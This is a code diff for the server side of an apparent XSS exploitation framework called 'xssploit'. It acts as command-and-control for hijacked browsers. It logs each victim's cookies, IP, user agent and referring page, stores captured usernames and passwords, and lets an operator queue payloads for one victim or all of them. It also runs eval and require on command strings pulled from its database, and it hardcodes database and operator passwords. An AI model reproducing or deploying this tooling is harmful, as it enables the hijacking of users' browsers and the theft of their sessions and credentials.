@@ -8,6 +8,14 @@ $GLOBALS['LOGFORMAT'] = '[%w]: [%I:%r:%n:%p]: %m';
 $GLOBALS['LOGFILE'] = '/tmp/xssploit.log';
 $log = Logger::getLogger("app");
 
+header( 'Expires: Sat, 26 Jul 1997 05:00:00 GMT' );
+header( 'Last-Modified: ' . gmdate( 'D, d M Y H:i:s' ) . ' GMT' );
+header( 'Cache-Control: no-store, no-cache, must-revalidate' );
+header( 'Cache-Control: post-check=0, pre-check=0', false );
+header( 'Pragma: no-cache' );
+header('Content-type: text/javascript');
+
+
 
 
 class DB
@@ -238,41 +246,118 @@ class DB
 	}
 }
 
+function create_host($db, $guid, $cookies) {
+	$agent = $_SERVER['HTTP_USER_AGENT'];
+	$os = "unknown";
+	$browser = "unknown";
+	if (stristr($agent, "linux") >= 0)
+		$os = "linux";
+	else if (stristr($agent, "android") >= 0)
+		$os = "android";
+	else if (stristr($agent, "bsd ") >= 0)
+		$os = "bsd";
+	else if (stristr($agent, "ios") >= 0)
+		$os = "ios";
+	else if (stristr($agent, "ipad") >= 0)
+		$os = "ipad";
+	else if (stristr($agent, "iphone") >= 0)
+		$os = "iphone";
+	else if (stristr($agent, "ipod") >= 0)
+		$os = "ipod";
+	else if (stristr($agent, "macintosh") >= 0)
+		$os = "mac";
+	else if (stristr($agent, "windows") >= 0)
+		$os = "win";
+
+	if (stristr($agent, "chrome"))
+		$browser = "chrome";
+	else if (stristr($agent, "chrome"))
+		$browser = "chrome";
+	else if (stristr($agent, "firefox"))
+		$browser = "firefox";
+	else if (stristr($agent, "msie"))
+		$browser = "msie";
+	else if (stristr($agent, "opera"))
+		$browser = "opera";
+	else if (stristr($agent, "safari"))
+		$browser = "safari";
+	else if (stristr($agent, "mozilla"))
+		$browser = "mozilla";
+
+	$log = Logger::getLogger("app");
+	$log->trace("$agent  [$os : $browser]");
+	// does the host already exist?
+	$host = $db->select("find host", "SELECT * FROM host", array("remote_ip" => $_SERVER['REMOTE_ADDR'], 'browser' => $browser, 'os' => $os));
+	// update it
+	if (isset($host[0])) {
+		$log->warn("UPDATE!");
+
+		$db->update("update host", "host", array('guid'=>$guid, 'cookies' => $cookies), array("remote_ip" => $_SERVER['REMOTE_ADDR'], 'browser' => $browser, 'os' => $os));
+		return $host[0]['id'];
+	}
+
+	// create a new one
+	$log->warn("CREATE HOST");
+	$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $cookies, 'guid' => $guid, 'browser' => $browser, 'os' => $os));
+
+	return $id;
+}
+
+function run_commands($db, $guid) {
+	// a command?
+	$log = Logger::getLogger("app");
+	$rows = $db->select("check command", "SELECT * FROM commands", array("guid" => $guid));
+	if (isset($rows[0])) {
+		foreach ($rows as $row) {
+			$foo = parse_url($row['command']);
+			$a="$" . str_replace("&", "\"; $", str_replace("=", "=\"", $foo['query'])) . "\";";
+			$log->info("run {$foo['path']} ($a)");
+			eval($a);
+			require(trim($foo['path']));
+
+			// don't remove autorun commands
+			if ($guid != "AUTORUN") {
+				$db->delete("remove executed command", "commands", array("id" => $row['id']));
+			}
+			$db->insert("audit command", "audit", array("guid" => $guid, "command" => $row['command'], "id" => null));
+		}
+	}
+}
+
 try {
-	$db = DB::getConnection("localhost", "root", "pinkfloyd", "xssploit");
+	$db = DB::getConnection("infosec3.body.local", "root", "pinkfloyd", "xssploit");
 
 	if (isset($_GET['reg'])) {
-		$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $_GET['c'], 'guid' => $_GET['reg']));
+		create_host($db, $_GET['reg'], $_GET['c']);
+		$log->info("registered new host: {$_GET['reg']}");
+		//require("frame_me.php");
+		//require("fit_status.php");
+		run_commands($db, "AUTORUN");
 		exit;
 	}
-	if ($_GET['id']) {
-		header('Content-type: text/javascript');
+	if (isset($_GET['id'])) {
 		// which host?
 		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $_GET['id']));
-		if (!isset($host[0]['id'])) {
-			$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => null, 'guid' => $_GET['id']));
+		// TODO: send register command!
+		if (!isset($host[0])) {
+			$log->error("NO SUCH HOST!");
+			$id = create_host($db, $_GET['id'], "null");
+			// $id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => null, 'guid' => $_GET['id']));
 			$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
 		}
-		else { $db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id'])); }
+		else {
+			$db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id']));
+			// add debug log
+			if (isset($_GET['d']) && strlen($_GET['d']) > 1) { $db->insert("log debug", "debug_log", array("guid" => $_GET['id'], "log" => $_GET['d'])); }
+			run_commands($db, $_GET['id']);
+			exit;
+		}
 
 		// do we have creds ?
 		if (isset($_GET['u'])) {
-			$id = $db->insert("create host", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
+			$id = $db->insert("create auth", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
 				'user' => $_GET['u'], 'pass' => $_GET['p']));
 		}
-		// a command?
-		$rows = $db->select("check command", "SELECT * FROM commands WHERE guid = '{$_GET['id']}'");
-		if (isset($rows[0])) {
-			$foo = parse_url($rows[0]['command']);
-			$log->error(print_r($rows, true));
-			$foo['query'];
-			$a="$" . str_replace("&", "\"; $", str_replace("=", "=\"", $foo['query'])) . "\";";
-			eval($a);
-			$log->error($a);
-			require($foo['path']);
-			$db->delete("remove executed command", "commands", array("id" => $rows[0]['id']));
-		}
-		exit;
 	}
 
 	if ($_GET['auth'] != "pinedale") {
@@ -299,12 +384,32 @@ try {
 	}
 
 	if ($_GET['A'] == "list") {
-		$rows = $db->select("get hosts", "SELECT * FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
+		$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
+		$rows2 = $db->select("get hosts", "SELECT *, 'inactive' as class FROM host", array("heartbeat < " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
 		//print_r($rows);
-		header('Content-type: text/javascript');
-		echo "console.log('CALLBACK!'); host_list = " . json_encode($rows) . ";\n";
+		echo "host_list = " . json_encode(array_merge($rows, $rows2)) . ";\n";
 		echo "update_list()";
 	}
+
+	if ($_GET['A'] == "exploit") { 
+		$command = "{$_GET['payload']}.php?".$_SERVER['QUERY_STRING'];
+		if ($_GET['target'] == "ALL") {
+			$rows = $db->select("get hosts", "SELECT *, 'active' as class FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
+			foreach ($rows as $row) {
+				$db->insert("add command", "commands", array("guid" => $row['guid'], "command" => $command, "id" => null));
+			}
+		}
+		else {
+			$db->insert("add command", "commands", array("guid" => $_GET['target'], "command" => $command, "id" => null));
+		}
+	}
+	if ($_GET['A'] == "debug") { 
+		$rows = $db->select("get hosts", "SELECT * FROM debug_log", array("guid" => $_GET['guid']));
+
+		echo "debugLog = " . json_encode($rows) . ";\n";
+		echo "update_debug()";
+	}
+	
 
 } catch(Exception $e) {
 	echo "<pre>";
